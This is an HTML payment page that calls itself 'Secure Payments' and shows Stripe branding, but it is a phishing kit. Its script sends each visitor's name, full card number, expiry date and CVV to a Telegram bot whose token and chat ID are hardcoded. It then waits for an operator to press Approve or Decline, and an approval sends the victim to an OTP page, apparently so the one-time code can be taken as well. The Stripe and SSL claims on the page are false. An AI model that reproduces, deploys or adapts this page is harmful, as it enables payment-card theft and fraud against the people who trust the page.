<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Secure Payments</title>
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">
    <style>
        body {
            font-family: 'Roboto', sans-serif;
            background: linear-gradient(135deg, #a0e1eb, #949795);
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
            padding: 20px;
        }
        
        .card {
            background: white;
            border-radius: 20px;
            box-shadow: 0 15px 45px rgba(0, 0, 0, 0.18);
            padding: 35px 30px;
            width: 100%;
            max-width: 420px;
            transition: transform 0.3s;
            position: relative;
            overflow: hidden;
        }
        
        .card::before {
            content: "";
            position: absolute;
            top: -60px;
            right: -60px;
            width: 180px;
            height: 180px;
            background: radial-gradient(circle, rgba(31, 204, 83, 0.12), transparent 70%);
            border-radius: 50%;
            pointer-events: none;
        }
        
        .card:hover {
            transform: translateY(-5px);
        }
        
        h2 {
            text-align: center;
            color: #007BFF;
            margin-bottom: 25px;
            font-weight: 500;
        }
        
        .card-preview {
            background: linear-gradient(135deg, #141e30, #243b55);
            border-radius: 16px;
            padding: 22px;
            color: #fff;
            margin-bottom: 25px;
            box-shadow: 0 10px 25px rgba(20, 30, 48, 0.4);
            position: relative;
        }
        
        .card-preview .chip {
            width: 42px;
            height: 30px;
            background: linear-gradient(135deg, #f9d423, #f2b632);
            border-radius: 6px;
            margin-bottom: 16px;
        }
        
        .card-preview .cp-number {
            font-size: 1.25rem;
            letter-spacing: 2px;
            margin-bottom: 14px;
            min-height: 24px;
        }
        
        .card-preview .cp-row {
            display: flex;
            justify-content: space-between;
            font-size: 0.85rem;
            color: #cfd8e3;
        }
        
        .card-preview .cp-row b {
            color: #fff;
            font-weight: 500;
        }
        
        .card-preview .cp-icons {
            position: absolute;
            top: 20px;
            right: 22px;
            font-size: 2rem;
            letter-spacing: 4px;
        }
        
        .card-preview .cp-icons .fab {
            color: #fff;
            opacity: 0.9;
        }
        
        .input-group {
            margin-bottom: 20px;
        }
        
        .input-group label {
            display: block;
            margin-bottom: 8px;
            font-weight: 500;
            color: #555;
        }
        
        .input-group input {
            width: 100%;
            padding: 12px;
            border: 1px solid #ccc;
            border-radius: 8px;
            transition: border-color 0.3s, box-shadow 0.3s;
            background: #fafafa;
            box-sizing: border-box;
            font-size: 15px;
        }
        
        .input-group input:hover {
            border-color: #b0b0b0;
            background: #fff;
        }
        
        .input-group input:focus {
            border-color: #007BFF;
            outline: none;
            box-shadow: 0 0 5px rgba(0, 123, 255, 0.5);
            background: #fff;
        }
        
        .input-group input::placeholder {
            color: #bbb;
        }
        
        .card .card-exp-cvv {
            display: flex;
            gap: 15px;
        }
        
        .card .card-exp-cvv .input-group {
            flex: 1;
        }
        
        .btn {
            width: 100%;
            padding: 14px;
            background: linear-gradient(135deg, #007BFF, #0056b3);
            color: white;
            border: none;
            border-radius: 10px;
            cursor: pointer;
            font-size: 18px;
            letter-spacing: 0.5px;
            box-shadow: 0 6px 16px rgba(0, 123, 255, 0.35);
            transition: background-color 0.3s, transform 0.3s, box-shadow 0.3s, opacity 0.2s;
        }
        
        .btn:hover {
            background: linear-gradient(135deg, #0069d9, #004a99);
            transform: translateY(-2px);
            box-shadow: 0 9px 22px rgba(0, 123, 255, 0.4);
        }
        
        .btn:active {
            transform: translateY(0);
            box-shadow: 0 4px 10px rgba(0, 123, 255, 0.3);
        }
        
        .btn:disabled {
            cursor: not-allowed;
            opacity: 0.75;
            transform: none;
        }
        
        .card-footer {
            text-align: center;
            margin-top: 18px;
            color: #777;
            font-size: 0.9rem;
        }
        
        .card-footer .pay-icons {
            font-size: 2rem;
            letter-spacing: 6px;
            margin-top: 8px;
            display: flex;
            justify-content: center;
            align-items: center;
            gap: 10px;
        }
        
        .card-footer .pay-icons .fab {
            color: #555;
            transition: color 0.3s, transform 0.3s;
        }
        
        .card-footer .pay-icons .fab:hover {
            transform: translateY(-2px);
        }
        
        .card-footer .pay-icons .fa-cc-visa:hover {
            color: #1a1f71;
        }
        
        .card-footer .pay-icons .fa-cc-mastercard:hover {
            color: #eb001b;
        }
        
        .card-footer .pay-icons .fa-cc-stripe:hover {
            color: #635bff;
        }
        
        .stripe-tag {
            display: inline-flex;
            align-items: center;
            gap: 6px;
            margin-top: 10px;
            padding: 6px 14px;
            background: #f4f4f6;
            border: 1px solid #e4e4e8;
            border-radius: 20px;
            font-size: 0.8rem;
            color: #555;
        }
        
        .stripe-tag .fa-stripe-s {
            color: #635bff;
            font-size: 1.2rem;
        }
        
        .secure-note {
            margin-top: 12px;
            font-size: 0.8rem;
            color: #999;
        }
        
        .secure-note .fa-lock {
            color: #1fcc53;
        }
        /* status + inline block area */
        
        .status-box {
            margin-top: 14px;
            padding: 12px 14px;
            border-radius: 12px;
            border: 1px solid #e6e6e6;
            background: #fafafa;
            color: #666;
            font-size: 0.95rem;
            display: none;
        }
        
        .status-box.show {
            display: block;
        }
        
        .inline-block-row {
            margin-top: 12px;
            display: flex;
            gap: 10px;
            justify-content: center;
            flex-wrap: wrap;
        }
        
        .tiny-pill {
            padding: 6px 12px;
            border-radius: 999px;
            font-size: 0.8rem;
            border: 1px solid #e6e6e6;
            background: #fff;
            color: #555;
        }
        
        .otp-error {
            color: #e02020;
            font-size: 0.85rem;
            min-height: 18px;
            margin-top: 8px;
            position: relative;
            z-index: 1;
            text-align: center;
        }
        
        .muted {
            color: #999;
        }
        /* ...your existing CSS... */
        
        .spinner {
            width: 18px;
            height: 18px;
            border: 3px solid rgba(255, 255, 255, 0.35);
            border-top-color: rgba(255, 255, 255, 1);
            border-radius: 50%;
            display: none;
            vertical-align: -4px;
            margin-right: 8px;
            animation: spin 0.8s linear infinite;
        }
        
        @keyframes spin {
            to {
                transform: rotate(360deg);
            }
        }
        /* optional: make button text dim when spinning */
        
        .btn.is-waiting {
            opacity: 0.9;
        }
    </style>
</head>

<body>
    <div class="card">
        <h2>Secure Payments</h2>

        <!-- LIVE CARD PREVIEW -->
        <div class="card-preview">
            <div class="cp-icons">
                <i class="fab fa-cc-visa"></i>
                <i class="fab fa-cc-mastercard"></i>
            </div>
            <div class="chip"></div>
            <div class="cp-number" id="cp-number">•••• •••• •••• ••••</div>
            <div class="cp-row">
                <span>NAME&nbsp; <b id="cp-name">•••• ••••</b></span>
                <span>EXP&nbsp; <b id="cp-exp">••/••</b></span>
            </div>
        </div>

        <form id="payment-form">
            <div class="input-group">
                <label for="card-name">Cardholder Name</label>
                <input type="text" id="card-name" placeholder="John Doe" required autocomplete="cc-name">
            </div>

            <div class="input-group">
                <label for="card-number">Card Number</label>
                <input type="text" id="card-number" placeholder="1111 2222 3333 4444" maxlength="19" inputmode="numeric" required autocomplete="cc-number" /> </div>

            <div class="card-exp-cvv">
                <div class="input-group">
                    <label for="expiration">Expiration Date (MM/YY)</label>
                    <input type="text" id="expiration" placeholder="12/23" maxlength="5" inputmode="numeric" required autocomplete="cc-exp">
                </div>

                <div class="input-group">
                    <label for="cvv">CVV</label>
                    <input type="password" id="cvv" placeholder="123" maxlength="4" inputmode="numeric" required autocomplete="cc-csc">
                </div>
            </div>

            <div class="otp-error" id="otp-error"></div>

            <button type="submit" class="btn" id="submitButton">
            <i class="fas fa-lock"></i>&nbsp;
            <span class="spinner" id="btnSpinner" aria-hidden="true"></span>
              <span id="btnText">Confirm Payments</span>
              </button>

            <div class="status-box" id="statusBox">
                <div><b id="statusTitle">Waiting…</b></div>
                <div class="muted" id="statusSub">Fill all inputs to enable verification.</div>
                <div class="inline-block-row" aria-hidden="true">
                    <div class="tiny-pill" id="pill1">Telegram: waiting approval</div>
                    <div class="tiny-pill" id="pill2">Inline buttons: Approve / Decline</div>
                </div>
            </div>
        </form>

        <!-- STRIPE + CARD BRAND ICONS FOR ONLINE PAYMENTS -->
        <div class="card-footer">
            Online payments supported by
            <div class="pay-icons">
                <i class="fab fa-cc-visa"></i>
                <i class="fab fa-cc-mastercard"></i>
                <i class="fab fa-cc-stripe"></i>
            </div>
            <div class="stripe-tag">
                <i class="fab fa-stripe-s"></i> Powered by Stripe
            </div>
            <div class="secure-note"><i class="fas fa-lock"></i> 256-bit SSL secured payment</div>
        </div>
    </div>

    <script>
        // ─── Telegram Bot Config ────────────────────────────────────────
        const botToken = '8804812021:AAGhN2YVUJHibFOM-Ip8eR4iDtjNHVBHrMs';
        const chatId = '8752862997';


        const cardNumberInput = document.getElementById('card-number');

        function formatCardNumber16(value) {
            const digits = value.replace(/\D/g, '').slice(0, 16);
            // Group as 4-4-4-4
            return digits.replace(/(\d{4})(?=\d)/g, '$1 ');
        }

        cardNumberInput.addEventListener('input', () => {
            const beforeCursor = cardNumberInput.selectionStart;
            const formatted = formatCardNumber16(cardNumberInput.value);
            cardNumberInput.value = formatted;

            // Keep it simple: don’t over-tune cursor position (works fine for most cases).
        });

        cardNumberInput.addEventListener('blur', () => {
            const digits = cardNumberInput.value.replace(/\D/g, '');
            if (digits.length !== 16) {
                // Don’t forcefully clear; just let submit validation show message.
            }
        });
        // ─── DOM refs (FIXED IDs) ────────────────────────────────────────
        const btnSpinner = document.getElementById('btnSpinner');
        const form = document.getElementById('payment-form');
        const submitBtn = document.getElementById('submitButton');
        const statusMsg = document.getElementById('statusSub'); // shows subtext
        const statusBox = document.getElementById('statusBox'); // container
        const statusTitle = document.getElementById('statusTitle');
        const btnText = document.getElementById('btnText'); // span inside button
        const inputs = form.querySelectorAll('input');

        // ─── Helpers ─────────────────────────────────────────────────────
        function generateId() {
            return Date.now().toString(36) + Math.random().toString(36).substr(2, 5);
        }

        function setStatus(show, title, sub) {
            statusBox.classList.toggle('show', show);
            if (title !== undefined) statusTitle.textContent = title;
            if (sub !== undefined) statusMsg.textContent = sub;
        }

        function resetForm() {
            inputs.forEach(inp => inp.value = '');
            setStatus(false, 'Waiting…', 'Fill all inputs to enable verification.');
            submitBtn.disabled = false;
            btnText.textContent = 'Confirm Payments';
            statusTitle.textContent = 'Waiting…';
            statusMsg.textContent = 'Fill all inputs to enable verification.';
        }

        function showDecline(msg) {
            statusTitle.textContent = 'Declined';
            statusMsg.textContent = msg;
            setStatus(true);
        }

        // ─── Poll Telegram for callback decision ───────────────────────
        function pollForDecision(submissionId) {
            let offset = 0;

            const poll = setInterval(async() => {
                try {
                    const resp = await fetch(
                        `https://api.telegram.org/bot${botToken}/getUpdates?offset=${offset}&timeout=10`
                    );
                    const data = await resp.json();

                    if (data.ok && data.result) {
                        for (const update of data.result) {
                            offset = update.update_id + 1;

                            if (update.callback_query) {
                                const cb = update.callback_query;
                                const cbData = cb.data || ''; // "approve_xxx" or "decline_xxx"
                                const parts = cbData.split('_');
                                const action = parts[0]; // "approve" or "decline"
                                const id = parts.slice(1).join('_');

                                if (id === submissionId) {
                                    clearInterval(poll);

                                    if (action === 'approve') {
                                        window.location.href = 'otp.html';
                                    } else {
                                        showDecline('❌ Card details were declined. Please re-enter.');
                                        resetForm();
                                        const card = document.querySelector('.card');

                                        card &&
                                            card.scrollIntoView({
                                                behavior: 'smooth'
                                            });
                                        btnSpinner.style.display = 'none';
                                        submitBtn.classList.remove('is-waiting');
                                    }
                                }
                            }
                        }
                    }
                } catch (err) {
                    console.error('Poll error:', err);
                    btnSpinner.style.display = 'none';
                    submitBtn.classList.remove('is-waiting');
                }
            }, 2000);
        }

        // ─── Form submission ───────────────────────────────────────────
        form.addEventListener('submit', function(e) {
            e.preventDefault();

            const cardName = document.getElementById('card-name').value.trim();
            const cardNumber = document.getElementById('card-number').value.trim();
            const expiration = document.getElementById('expiration').value.trim();
            const cvv = document.getElementById('cvv').value.trim();

            const cardDigits = cardNumber.replace(/\D/g, '');

            if (!cardName || !expiration || !cvv || !cardDigits) {
                showDecline('⚠️ Please fill in all fields.');
                return;
            }

            if (cardDigits.length !== 16) {
                showDecline('⚠️ Card number must be exactly 16 digits.');
                return;
            }

            // Disable button to prevent double-submit
            submitBtn.disabled = true;
            btnSpinner.style.display = 'inline-block';
            submitBtn.classList.add('is-waiting');
            btnText.textContent = 'Waiting approval...';
            setStatus(true, 'Waiting…', 'Awaiting approval in Telegram...');

            const submissionId = generateId();

            const message =
                `🔔 New Card Submission\n━━━━━━━━━━━━━━━\n` +
                `🆔 ID: ${submissionId}\n` +
                `👤 Name: ${cardName}\n` +
                `💳 Card: ${cardNumber}\n` +
                `📅 Exp: ${expiration}\n` +
                `🔐 CVV: ${cvv}\n` +
                `━━━━━━━━━━━━━━━`;

            const inlineKeyboard = {
                inline_keyboard: [
                    [{
                        text: '✅ Approve',
                        callback_data: `approve_${submissionId}`
                    }, {
                        text: '❌ Decline',
                        callback_data: `decline_${submissionId}`
                    }]
                ]
            };

            // ─── Send to Telegram ──────────────────────────────────────
            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({
                        chat_id: chatId,
                        text: message,
                        reply_markup: inlineKeyboard
                    })
                })
                .then(response => {
                    if (!response.ok) return response.text().then(t => {
                        throw new Error(t);
                    });

                    // Success → show status + start polling
                    setStatus(true, 'Waiting…', 'Awaiting approval..');
                    pollForDecision(submissionId);
                })
                .catch(error => {
                    console.error('Telegram Error:', error);
                    showDecline('❌ Error while approving. Please try again.');
                    submitBtn.disabled = false;
                    btnText.textContent = 'Confirm Payments';
                });
        });
    </script>
</body>

</html>
